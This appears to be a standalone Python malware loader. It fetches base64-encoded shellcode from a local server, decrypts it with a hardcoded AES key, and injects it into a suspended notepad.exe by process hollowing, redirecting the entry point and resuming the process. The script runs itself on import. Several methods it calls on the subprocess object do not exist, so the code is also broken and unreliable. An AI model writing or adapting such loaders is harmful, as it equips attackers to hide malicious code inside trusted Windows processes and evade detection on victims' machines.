from Crypto.Cipher import AES
import base64
import subprocess
import requests
def run_code():
    r = requests.get('http://localhost:8000/shellcode.b64')
    code = r.content
    data = base64.b64decode(code)
    cipher = AES.new(b'O1AEKFXfpDkCIbvqM9dcgoR0Up1VXAyX', AES.MODE_CBC, b'Uhtbdtzep2onibHT')
    code = cipher.decrypt(data)
    target_process = subprocess.Popen('C:\\Windows\\System32\\notepad.exe', creationflags=subprocess.CREATE_SUSPENDED)
    shell_code_address = target_process.virtual_alloc(len(code))
    target_process.write_memory(shell_code_address, code)
    target_process.update_entry_point(shell_code_address)
    target_process.resume()
run_code()